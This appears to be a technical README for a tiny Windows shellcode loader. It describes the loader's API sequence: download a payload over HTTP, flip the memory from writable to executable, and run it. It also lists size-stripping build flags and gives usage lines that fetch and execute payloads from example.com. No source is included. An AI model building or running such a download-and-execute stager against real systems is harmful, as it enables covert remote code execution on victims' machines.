# Technical Implementation Details

## Shellcode Loader Architecture

This minimal Windows shellcode loader implements a complete HTTP download and execution system using only Windows API functions, with no dependency on the C runtime library.

### Key Technical Features

#### 1. Custom Entry Point
- Uses `WinMainCRTStartup()` instead of `main()` to avoid CRT linking
- Manually parses command line arguments using `GetCommandLineW()`
- Directly calls `ExitProcess()` for termination

#### 2. Pure Windows API Implementation
**Network Operations:**
- `InternetOpen()` - Initialize WinINet session
- `InternetOpenUrl()` - Open HTTP/HTTPS URL
- `InternetReadFile()` - Download data in chunks
- `InternetCloseHandle()` - Clean up handles

**Memory Management:**
- `VirtualAlloc()` - Allocate memory with specific permissions
- `VirtualProtect()` - Change memory protection to executable
- `VirtualFree()` - Release allocated memory
- `CopyMemory()` - Copy data between buffers

#### 3. Dynamic Buffer Management
- Starts with 4KB buffer, doubles when needed
- Handles downloads of arbitrary size
- Automatically expands during download process

#### 4. Memory Protection Transition
1. Allocate as `PAGE_READWRITE` for download
2. Change to `PAGE_EXECUTE_READ` before execution
3. Execute via function pointer cast

### Compilation Optimizations

#### Size Reduction Flags
```bash
-Os                              # Optimize for size
-fno-stack-protector            # Remove stack protection
-fno-asynchronous-unwind-tables # Remove exception tables
-fno-ident                      # Remove compiler identification
-fdata-sections                 # Place data in separate sections
-ffunction-sections             # Place functions in separate sections
```

#### Linker Optimizations
```bash
-nostdlib                       # Don't link standard library
-nostartfiles                   # Don't use standard startup files
-s                              # Strip symbols
-Wl,--gc-sections              # Garbage collect unused sections
-Wl,--strip-all                # Strip all symbols
-Wl,--no-seh                   # Disable SEH (Windows)
```

### Binary Analysis

**Final binary specifications:**
- Size: 2048 bytes (2KB) exact
- Format: PE32/PE32+ (Windows executable)
- Sections: 2 (minimal PE structure)
- Dependencies: kernel32.dll, wininet.dll
- Runtime: No CRT dependency

### Security Considerations

#### Execution Flow
1. Parse URL from command line
2. Establish HTTP connection
3. Download shellcode to RW memory
4. Change memory protection to RX
5. Execute via function pointer

#### Memory Safety
- Proper handle cleanup on all code paths
- Memory is freed even on error conditions
- No buffer overflows (dynamic expansion)

#### Error Handling
- Validates each API call
- Graceful cleanup on failure
- Appropriate exit codes

### Usage Examples

```cmd
# Download and execute from HTTP
shellcode_loader.exe http://example.com/payload.bin

# Download and execute from HTTPS
shellcode_loader.exe https://secure.example.com/payload.bin
```

### Comparison: Standard vs Mini Version

Both versions achieve the same 2KB size but with different code organization:

**Standard Version (`shellcode_loader.c`):**
- More structured error handling
- Detailed cleanup routines
- Better code readability
- Explicit function separation

**Mini Version (`shellcode_loader_mini.c`):**
- More compact code structure
- Fewer intermediate variables
- Single-function approach
- Reduced branching

Despite different coding styles, both compile to identical binary sizes due to compiler optimizations.